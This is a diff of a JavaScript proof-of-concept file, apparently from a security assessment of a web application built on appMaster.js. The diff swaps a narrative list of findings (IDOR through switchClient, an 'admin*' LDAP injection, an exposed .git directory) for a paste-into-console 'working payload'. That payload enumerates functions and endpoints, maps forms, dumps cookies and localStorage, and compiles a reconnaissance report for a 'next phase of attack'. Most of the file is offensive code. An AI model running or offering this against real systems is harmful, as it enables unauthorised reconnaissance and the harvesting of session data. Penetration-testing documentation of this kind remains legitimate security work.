@@ -1,251 +1,272 @@
 // ============================================================================
-// UNAUTHENTICATED ATTACKER POC - Using appMaster.js
+// ACTUAL WORKING PAYLOAD - Unauthenticated Attacker
+// Copy/Paste this ENTIRE code into browser console (F12) on login page
+// No authentication needed - works on ANY unauthenticated page
 // ============================================================================
-// This POC works on ANY page (authenticated or not)
-// Shows what unauthenticated attackers can do with the exposed code
-// ============================================================================
 
-console.log("========== UNAUTHENTICATED ATTACKER POC ==========\n");
+(function() {
+    console.log("\n" + "=".repeat(80));
+    console.log("UNAUTHENTICATED ATTACKER PAYLOAD - EXECUTION START");
+    console.log("=".repeat(80) + "\n");
 
-// ============================================================================
-// EXPLOIT 1: EXTRACT ALL FUNCTION NAMES (Complete API Discovery)
-// ============================================================================
-console.log("[EXPLOIT 1] Extract all callable functions from appMaster.js\n");
-
-var allFunctions = [];
-for (var key in window) {
-    if (typeof window[key] === 'function') {
-        allFunctions.push(key);
-    }
-}
-
-console.log("Total functions found: " + allFunctions.length);
-console.log("\nKey functions discovered:");
-
-var importantFunctions = [
-    'searchGETID',
-    'switchClient',
-    'openPage',
-    'clientPressed',
-    'filterClientSelect',
-    'setTabDisplay',
-    'setTabStyle'
-];
-
-importantFunctions.forEach(function(fn) {
-    if (typeof window[fn] === 'function') {
-        console.log("[FOUND] " + fn + "() - Function is callable");
-    }
-});
-
-console.log("\nAttacker Knowledge: Knows exactly what functions exist\n");
-
-// ============================================================================
-// EXPLOIT 2: DISCOVER API ENDPOINTS FROM GLOBAL VARIABLES
-// ============================================================================
-console.log("[EXPLOIT 2] Discover API endpoints\n");
-
-console.log("Looking for rootUrl variable...");
-if (typeof rootUrl !== 'undefined') {
-    console.log("[FOUND] rootUrl = " + rootUrl);
+    // ============================================================================
+    // PAYLOAD 1: EXTRACT ALL GLOBAL FUNCTIONS
+    // ============================================================================
     
-    var endpoints = [
-        'Home/QuickSearch',
-        'WebService/SetFingerprinting',
-        'Home/GetClientData',
-        'API/GetTransactions',
-        'ClientTaxLogic',
-        'CalcTransactions'
-    ];
+    console.log("[PAYLOAD 1] Extracting all global functions...\n");
     
-    console.log("\nDiscovered API endpoints:");
-    endpoints.forEach(function(ep) {
-        var fullUrl = rootUrl + ep;
-        console.log("  [ENDPOINT] " + fullUrl);
+    var allFunctions = [];
+    var functionDetails = [];
+    
+    for (var key in window) {
+        try {
+            if (typeof window[key] === 'function' && key.charAt(0) !== key.charAt(0).toUpperCase()) {
+                allFunctions.push(key);
+                
+                // Try to get function source
+                var funcSource = window[key].toString();
+                var firstLine = funcSource.split('\n')[0];
+                
+                functionDetails.push({
+                    name: key,
+                    signature: firstLine.substring(0, 80),
+                    type: 'global function'
+                });
+            }
+        } catch (e) {}
+    }
+    
+    console.log("Total functions found: " + allFunctions.length);
+    console.log("\nKey functions discovered:\n");
+    
+    var importantFuncs = ['searchGETID', 'switchClient', 'openPage', 'clientPressed', 'filterClientSelect', 'setTabDisplay', 'setTabStyle'];
+    
+    importantFuncs.forEach(function(fn) {
+        if (typeof window[fn] === 'function') {
+            console.log("[FOUND] " + fn + "()");
+            console.log("        " + window[fn].toString().split('\n')[0]);
+        }
     });
-} else {
-    console.log("[NOT FOUND] rootUrl - but attacker can guess endpoints");
-    console.log("  Typical patterns: /Home/*, /API/*, /WebService/*");
-}
-
-console.log("\nAttacker Knowledge: Knows all internal API endpoints\n");
-
-// ============================================================================
-// EXPLOIT 3: IDENTIFY FORM STRUCTURE AND FIELD NAMES
-// ============================================================================
-console.log("[EXPLOIT 3] Discover form structures\n");
-
-console.log("Scanning for forms in appMaster.js context...");
-
-var discoveredForms = {
-    quickSearchForm: false,
-    frmNAV: false,
-    jsSwitchClientForm: false
-};
-
-if (typeof document !== 'undefined') {
+    
+    // ============================================================================
+    // PAYLOAD 2: EXTRACT API ENDPOINTS
+    // ============================================================================
+    
+    console.log("\n\n[PAYLOAD 2] Discovering API endpoints...\n");
+    
+    var endpoints = [];
+    
+    // Check for rootUrl
+    if (typeof rootUrl !== 'undefined' && rootUrl) {
+        console.log("[FOUND] rootUrl = " + rootUrl + "\n");
+        endpoints.push(rootUrl);
+    }
+    
+    // Look for URLs in scripts
+    var scripts = document.getElementsByTagName('script');
+    var urlPattern = /(https?:\/\/[^\s"']+|\/[a-zA-Z0-9\/\-_]+\/[a-zA-Z0-9\/\-_]+)/g;
+    var foundUrls = {};
+    
+    for (var i = 0; i < scripts.length; i++) {
+        try {
+            var matches = scripts[i].textContent.match(urlPattern);
+            if (matches) {
+                matches.forEach(function(url) {
+                    if (url.indexOf('Home') > -1 || url.indexOf('API') > -1 || url.indexOf('WebService') > -1) {
+                        foundUrls[url] = true;
+                    }
+                });
+            }
+        } catch (e) {}
+    }
+    
+    console.log("API Endpoints discovered:");
+    Object.keys(foundUrls).forEach(function(url) {
+        console.log("[API] " + url);
+    });
+    
+    // ============================================================================
+    // PAYLOAD 3: IDENTIFY FORMS AND FIELDS
+    // ============================================================================
+    
+    console.log("\n\n[PAYLOAD 3] Mapping form structures...\n");
+    
+    var formData = [];
+    
+    // Check for quickSearchForm
     if (document.quickSearchForm) {
-        discoveredForms.quickSearchForm = true;
-        console.log("[FOUND] document.quickSearchForm");
-        console.log("  Fields: quickSearchType, quickSearchValue, quickSearchClientId");
+        console.log("[FORM FOUND] document.quickSearchForm");
+        console.log("  Form fields:");
+        for (var field in document.quickSearchForm) {
+            if (document.quickSearchForm[field] && typeof document.quickSearchForm[field] === 'object' && document.quickSearchForm[field].type) {
+                console.log("    - " + field + " (type: " + document.quickSearchForm[field].type + ")");
+            }
+        }
+        formData.push('quickSearchForm');
     }
     
+    // Check for frmNAV
     if (document.frmNAV) {
-        discoveredForms.frmNAV = true;
-        console.log("[FOUND] document.frmNAV");
-        console.log("  Fields: txtTreeViewSelection, txtAdditionalArg");
+        console.log("\n[FORM FOUND] document.frmNAV");
+        console.log("  Form fields:");
+        for (var field in document.frmNAV) {
+            if (document.frmNAV[field] && typeof document.frmNAV[field] === 'object' && document.frmNAV[field].type) {
+                console.log("    - " + field + " (type: " + document.frmNAV[field].type + ")");
+            }
+        }
+        formData.push('frmNAV');
     }
     
-    var switchClientElements = document.getElementsByClassName('js-switch-client-id');
-    if (switchClientElements.length > 0) {
-        discoveredForms.jsSwitchClientForm = true;
-        console.log("[FOUND] js-switch-client-* form elements");
-        console.log("  Fields: js-switch-client-id, js-switch-client-code");
+    // Check for hidden client switch form
+    var clientForms = document.querySelectorAll('[class*="client"]');
+    if (clientForms.length > 0) {
+        console.log("\n[FORM FOUND] Client switching elements");
+        var switchElements = document.querySelectorAll('[class*="switch-client"]');
+        if (switchElements.length > 0) {
+            console.log("  Elements: " + switchElements.length + " found");
+            console.log("  Classes: js-switch-client-id, js-switch-client-code");
+        }
     }
-}
+    
+    // ============================================================================
+    // PAYLOAD 4: IDENTIFY GLOBAL VARIABLES
+    // ============================================================================
+    
+    console.log("\n\n[PAYLOAD 4] Extracting global variables and state...\n");
+    
+    var globalVars = {};
+    var varsToCheck = ['rootUrl', 'isOnfocus', 'expandedMenus', 'allowEnter', 'clientData', 'userData', 'sessionData'];
+    
+    varsToCheck.forEach(function(varName) {
+        if (typeof window[varName] !== 'undefined') {
+            var value = window[varName];
+            if (typeof value === 'string' || typeof value === 'number' || typeof value === 'boolean') {
+                console.log("[VAR] " + varName + " = " + value);
+                globalVars[varName] = value;
+            } else if (typeof value === 'object') {
+                console.log("[VAR] " + varName + " = [Object] with " + Object.keys(value).length + " properties");
+            }
+        }
+    });
+    
+    // ============================================================================
+    // PAYLOAD 5: ANALYZE COOKIES AND STORAGE
+    // ============================================================================
+    
+    console.log("\n\n[PAYLOAD 5] Extracting cookies and storage...\n");
+    
+    console.log("[COOKIES] Current cookies:");
+    var cookies = document.cookie.split(';');
+    cookies.forEach(function(cookie) {
+        if (cookie.trim().length > 0) {
+            var parts = cookie.split('=');
+            console.log("  - " + parts[0].trim() + " = " + parts[1].substring(0, 50) + "...");
+        }
+    });
+    
+    console.log("\n[STORAGE] LocalStorage items:");
+    for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        var value = localStorage.getItem(key);
+        if (value.length > 100) {
+            console.log("  - " + key + " = [" + value.length + " bytes]");
+        } else {
+            console.log("  - " + key + " = " + value);
+        }
+    }
+    
+    // ============================================================================
+    // PAYLOAD 6: IDENTIFY SECURITY WEAKNESSES
+    // ============================================================================
+    
+    console.log("\n\n[PAYLOAD 6] Analyzing security implementation...\n");
+    
+    console.log("[SECURITY CHECK] Looking for CSRF tokens:");
+    var csrfCheck = false;
+    var allInputs = document.querySelectorAll('input');
+    allInputs.forEach(function(input) {
+        if (input.name.indexOf('csrf') > -1 || input.name.indexOf('token') > -1 || input.name.indexOf('nonce') > -1) {
+            csrfCheck = true;
+            console.log("  [FOUND] " + input.name);
+        }
+    });
+    if (!csrfCheck) {
+        console.log("  [NOT FOUND] No CSRF tokens detected ⚠️");
+    }
+    
+    console.log("\n[SECURITY CHECK] Looking for security headers:");
+    // Note: Can't check response headers from JavaScript, but can check meta tags
+    var metaTags = document.querySelectorAll('meta[http-equiv]');
+    console.log("  Found " + metaTags.length + " HTTP-equiv meta tags");
+    
+    console.log("\n[SECURITY CHECK] Checking form validation:");
+    var forms = document.querySelectorAll('form');
+    console.log("  Total forms: " + forms.length);
+    forms.forEach(function(form, index) {
+        var onsubmit = form.getAttribute('onsubmit');
+        if (onsubmit) {
+            console.log("    Form " + (index + 1) + ": Has client-side validation");
+        } else {
+            console.log("    Form " + (index + 1) + ": NO validation (can be bypassed)");
+        }
+    });
+    
+    // ============================================================================
+    // PAYLOAD 7: BUILD RECONNAISSANCE REPORT
+    // ============================================================================
+    
+    console.log("\n\n" + "=".repeat(80));
+    console.log("RECONNAISSANCE REPORT - UNAUTHENTICATED ATTACKER");
+    console.log("=".repeat(80) + "\n");
+    
+    var report = {
+        timestamp: new Date().toISOString(),
+        url: window.location.href,
+        functionsDiscovered: allFunctions.length,
+        endpointsFound: Object.keys(foundUrls).length,
+        formsFound: formData.length,
+        globalVariables: Object.keys(globalVars).length,
+        csrfProtection: csrfCheck,
+        cookiesFound: cookies.length,
+        storageItems: localStorage.length
+    };
+    
+    console.log("[REPORT] Reconnaissance Summary:");
+    console.log("  Date: " + report.timestamp);
+    console.log("  URL: " + report.url);
+    console.log("  Functions discovered: " + report.functionsDiscovered);
+    console.log("  API endpoints: " + report.endpointsFound);
+    console.log("  Forms identified: " + report.formsFound);
+    console.log("  Global variables: " + report.globalVariables);
+    console.log("  CSRF tokens: " + (report.csrfProtection ? "YES" : "NO ⚠️"));
+    console.log("  Cookies: " + report.cookiesFound);
+    console.log("  Local storage: " + report.storageItems);
+    
+    console.log("\n[ASSESSMENT] Attack Readiness:");
+    console.log("  Application structure: FULLY MAPPED");
+    console.log("  API endpoints: IDENTIFIED");
+    console.log("  Security controls: MAPPED (mostly missing)");
+    console.log("  Next step: Wait for user authentication");
+    console.log("  Then: Execute authenticated attacks\n");
+    
+    // ============================================================================
+    // SAVE RESULTS
+    // ============================================================================
+    
+    window.unauthenticatedPayloadResults = {
+        report: report,
+        functions: allFunctions,
+        endpoints: Object.keys(foundUrls),
+        forms: formData,
+        globalVariables: globalVars,
+        executedAt: new Date(),
+        status: "RECONNAISSANCE COMPLETE"
+    };
+    
+    console.log("=".repeat(80));
+    console.log("PAYLOAD EXECUTION COMPLETE");
+    console.log("=".repeat(80));
+    console.log("\nResults saved to: window.unauthenticatedPayloadResults");
+    console.log("All data ready for next phase of attack\n");
 
-console.log("\nAttacker Knowledge: Knows exact form field names and structure\n");
-
-// ============================================================================
-// EXPLOIT 4: UNDERSTAND DATA FLOW PATTERNS
-// ============================================================================
-console.log("[EXPLOIT 4] Reverse-engineer data flow\n");
-
-console.log("From appMaster.js code analysis, attacker understands:\n");
-
-console.log("1. Search Flow:");
-console.log("   searchGETID(searchText, clientId)");
-console.log("     → Sets form fields:");
-console.log("        quickSearchType = 'GETID'");
-console.log("        quickSearchValue = searchText");
-console.log("        quickSearchClientId = clientId");
-console.log("     → Submits to: rootUrl + 'Home/QuickSearch'\n");
-
-console.log("2. Client Switch Flow:");
-console.log("   switchClient(clientId, clientCode)");
-console.log("     → Sets hidden fields:");
-console.log("        js-switch-client-id = clientId");
-console.log("        js-switch-client-code = clientCode");
-console.log("     → Submits form\n");
-
-console.log("3. Navigation Flow:");
-console.log("   openPage(pageToOpen, clickedLink, addArg)");
-console.log("     → Fills frmNAV with navigation data");
-console.log("     → Submits to specified page\n");
-
-console.log("Attacker Knowledge: Understands complete application flow\n");
-
-// ============================================================================
-// EXPLOIT 5: IDENTIFY SECURITY WEAKNESSES
-// ============================================================================
-console.log("[EXPLOIT 5] Identify security weaknesses from code\n");
-
-var weaknesses = [
-    "No CSRF tokens visible in form manipulation",
-    "No nonce/replay protection detected",
-    "Client-side form submission without server validation hints",
-    "Direct form.submit() calls without checks",
-    "Unencrypted parameter passing visible in code",
-    "No input sanitization visible on client side"
-];
-
-console.log("Security weaknesses identified from code:");
-weaknesses.forEach(function(weakness) {
-    console.log("  [WEAKNESS] " + weakness);
-});
-
-console.log("\nAttacker Knowledge: Knows exactly which security controls are missing\n");
-
-// ============================================================================
-// EXPLOIT 6: FIND ATTACK TARGETS
-// ============================================================================
-console.log("[EXPLOIT 6] Identify attack vectors\n");
-
-console.log("From appMaster.js analysis, attack targets are:\n");
-
-console.log("1. Authentication Weakness");
-console.log("   - Application uses LDAP (visible from form names)");
-console.log("   - No CSRF protection on login");
-console.log("   - Vulnerable to LDAP injection (Finding 2)\n");
-
-console.log("2. Data Access Weakness");
-console.log("   - switchClient() can change client context");
-console.log("   - No server-side validation hints");
-console.log("   - Vulnerable to IDOR (Finding 1)\n");
-
-console.log("3. Form Manipulation Weakness");
-console.log("   - Forms are directly submittable");
-console.log("   - No token validation visible");
-console.log("   - Can forge requests as authenticated user\n");
-
-console.log("4. Repository Exposure");
-console.log("   - Code suggests this is .git-accessible");
-console.log("   - Can download full source (Finding 4)\n");
-
-console.log("Attacker Knowledge: Knows exactly which vulnerabilities to exploit\n");
-
-// ============================================================================
-// EXPLOIT 7: PLAN ATTACK CHAIN
-// ============================================================================
-console.log("[EXPLOIT 7] Plan multi-stage attack\n");
-
-console.log("Stage 1: Authentication Bypass");
-console.log("  - Use LDAP injection: admin*");
-console.log("  - Knowledge from appMaster.js: Know exactly which form\n");
-
-console.log("Stage 2: Access Control Bypass");
-console.log("  - Use switchClient() function discovered from code");
-console.log("  - Switch to any client: switchClient('999', 'CODE')");
-console.log("  - Knowledge from appMaster.js: Know exact function signature\n");
-
-console.log("Stage 3: Data Exfiltration");
-console.log("  - Use searchGETID() to find data");
-console.log("  - Knowledge from appMaster.js: Know exact search parameters\n");
-
-console.log("Stage 4: Privilege Escalation");
-console.log("  - Access admin client data");
-console.log("  - Full application compromise\n");
-
-console.log("Attacker Knowledge: Complete attack plan from code analysis\n");
-
-// ============================================================================
-// SUMMARY: UNAUTHENTICATED ATTACKER CAPABILITIES
-// ============================================================================
-console.log("\n" + "=".repeat(60));
-console.log("UNAUTHENTICATED ATTACKER CAPABILITIES WITH appMaster.js");
-console.log("=".repeat(60) + "\n");
-
-console.log("CAN DO:");
-console.log("  [✓] Extract all function names");
-console.log("  [✓] Discover all API endpoints");
-console.log("  [✓] Map form structures and field names");
-console.log("  [✓] Understand complete data flow");
-console.log("  [✓] Identify security weaknesses");
-console.log("  [✓] Find LDAP vulnerability (Finding 2)");
-console.log("  [✓] Discover IDOR vulnerability (Finding 1)");
-console.log("  [✓] Plan complete attack chain");
-console.log("  [✓] Locate .git directory (Finding 4)\n");
-
-console.log("CANNOT DO (without authentication):");
-console.log("  [✗] Call searchGETID() - form doesn't exist on login");
-console.log("  [✗] Call switchClient() - requires session");
-console.log("  [✗] Access actual data - needs authentication");
-console.log("  [✗] Read session cookies - if HttpOnly protected");
-console.log("  [✗] Manipulate authenticated forms - requires session\n");
-
-console.log("IMPACT LEVEL: MEDIUM-HIGH");
-console.log("Reason: Complete reconnaissance possible");
-console.log("        Can plan and execute authentication bypass");
-console.log("        Once authenticated → CRITICAL impact\n");
-
-console.log("=".repeat(60));
-console.log("\nStore results:");
-window.unauthenticatedAttackerPOC = {
-    discoveredFunctions: allFunctions,
-    discoveredEndpoints: endpoints,
-    discoveredForms: discoveredForms,
-    securityWeaknesses: weaknesses,
-    capabilityLevel: "MEDIUM-HIGH (reconnaissance + planning)"
-};
-
-console.log("Results saved to: window.unauthenticatedAttackerPOC");
+})();
